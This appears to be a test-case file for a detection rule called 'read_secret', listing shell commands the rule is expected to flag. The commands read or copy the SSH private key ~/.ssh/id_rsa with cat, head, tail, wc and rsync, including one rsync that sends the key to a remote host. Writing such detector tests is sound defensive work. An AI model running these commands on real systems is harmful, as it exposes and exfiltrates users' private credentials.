posix finds=read_secret | rsync -av ~/.ssh/ /tmp/ssh/
posix finds=read_secret | rsync -e ssh ~/.ssh/id_rsa host:/tmp/

# One line for every program the rule knows opens a file, in the shape that
# program takes its file in. A program the rule knows and no case names
# would read nothing, and nobody would notice.
posix finds=read_secret | cat ~/.ssh/id_rsa
posix finds=read_secret | head ~/.ssh/id_rsa
posix finds=read_secret | tail ~/.ssh/id_rsa
posix finds=read_secret | wc ~/.ssh/id_rsa
